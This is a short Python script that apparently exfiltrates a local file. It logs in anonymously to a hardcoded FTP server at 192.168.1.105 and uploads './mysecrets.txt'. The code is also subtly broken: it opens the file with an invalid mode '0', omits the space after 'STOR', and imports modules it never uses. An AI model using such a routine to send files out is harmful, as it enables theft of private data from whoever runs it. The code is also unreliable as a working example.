import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.1.105'):
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "anon@example.com")
    ftp.cwd('/pub/')
    ftp.storbinary("STOR" + os.path.basename(docpath), open(docpath, '0'), 1024)
    ftp.quit()

if __name__ == "__main__":
    plain_ftp('./mysecrets.txt')